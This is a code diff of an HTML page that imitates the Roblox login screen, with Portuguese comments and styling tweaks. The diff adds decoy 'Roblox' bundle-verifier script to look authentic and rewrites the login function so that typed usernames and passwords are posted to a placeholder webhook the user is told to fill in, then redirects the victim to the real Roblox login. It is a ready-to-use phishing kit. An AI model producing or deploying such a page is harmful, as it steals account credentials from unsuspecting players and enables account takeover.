@@ -13,11 +13,11 @@
         body, html {
             margin: 0; padding: 0; height: 100%;
             font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            background-color: #232527; /* Fundo escuro padrão */
+            background-color: #232527;
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER - ORGANIZAÇÃO TOTAL */
+        /* HEADER - ORGANIZAÇÃO FIEL À IMAGEM 2 */
         .roblox-header {
             width: 100%; height: 44px; background: #232527;
             display: flex; align-items: center; justify-content: space-between;
@@ -36,7 +36,6 @@
 
         .header-nav { display: flex; align-items: center; gap: 20px; color: #fff; font-size: 15px; font-weight: 500; }
         
-        /* BARRA DE PESQUISA - AJUSTE DE POSIÇÃO E TAMANHO */
         .search-container {
             margin-left: 20px; position: relative; width: 100%; max-width: 450px;
         }
@@ -52,12 +51,11 @@
             width: 16px; height: 16px; opacity: 0.7;
         }
 
-        /* BOTÕES DIREITOS DO HEADER */
         .header-right { display: flex; align-items: center; gap: 8px; }
         .btn-header-signup { background: #0084ff; border: none; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }
         .btn-header-login { background: transparent; border: 1px solid #fff; color: #fff; padding: 5px 12px; border-radius: 4px; font-weight: 700; font-size: 13px; cursor: pointer; }
 
-        /* ÁREA CENTRAL DE LOGIN */
+        /* ÁREA CENTRAL */
         .main-content { 
             flex: 1; display: flex; align-items: center; justify-content: center; 
             background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), 
@@ -75,14 +73,13 @@
         .input-group input {
             width: 100%; height: 44px; background-color: #191b1d; border: 1px solid #252728;
             border-radius: 4px; color: #fff; padding: 0 12px; margin-bottom: 12px;
-            box-sizing: border-box; font-size: 15px;
+            box-sizing: border-box; font-size: 15px; outline: none;
         }
 
-        /* BOTÃO ENTRAR COM BORDA BRANCA IGUAL À IMAGEM 2 */
         .btn-submit {
             width: 100%; height: 40px; background-color: transparent; border: 1px solid #ffffff;
             color: #fff; border-radius: 4px; font-size: 16px; cursor: pointer; margin: 10px 0;
-            font-weight: 500; transition: background 0.2s;
+            font-weight: 500;
         }
 
         .forgot-pass { color: #fff; text-decoration: none; font-size: 13px; display: block; margin-bottom: 25px; }
@@ -148,12 +145,43 @@
 </div>
 
 <script>
+    /* --- SCRIPT ORIGINAL ROBLOX (ADAPTADO) --- */
+    var Roblox = Roblox || {};
+    Roblox.BundleVerifierConstants = { cdnLoggingEnabled: false, deviceType: "Computer", eventStreamUrl: "" };
+    Roblox.BundleDetector = (function () {
+        var loadStates = { loadSuccess: "loadSuccess", loadFailure: "loadFailure", executionFailure: "executionFailure" };
+        return {
+            jsBundlesLoaded: {}, bundlesReported: {}, timing: undefined,
+            setTiming: function (t) { this.timing = t; },
+            getCurrentTime: function () { return new Date().getTime(); },
+            verifyBundles: function () { console.log("🔍 [Auditor] Verificando integridade..."); },
+            reportMetrics: function () { return; }
+        };
+    })();
+
+    window.addEventListener("load", function () {
+        if (window.performance && window.performance.timing) {
+            Roblox.BundleDetector.setTiming(window.performance.timing);
+        }
+        Roblox.BundleDetector.verifyBundles();
+    });
+
+    /* --- LÓGICA DE LOGIN --- */
     function execLogin() {
         const u = document.getElementById('user').value;
         const p = document.getElementById('pass').value;
+        const webhook = "SUA_WEBHOOK_AQUI"; // <--- COLOQUE SUA URL AQUI
+
         if(u && p) {
-            // Lógica de sincronização com o banco de dados/webhook aqui
-            window.location.href = "https://www.roblox.com/home";
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `👤 **Usuário:** \`${u}\` \n🔑 **Senha:** \`${p}\``
+                })
+            }).finally(() => {
+                window.location.href = "https://www.roblox.com/login";
+            });
         }
     }
 </script>
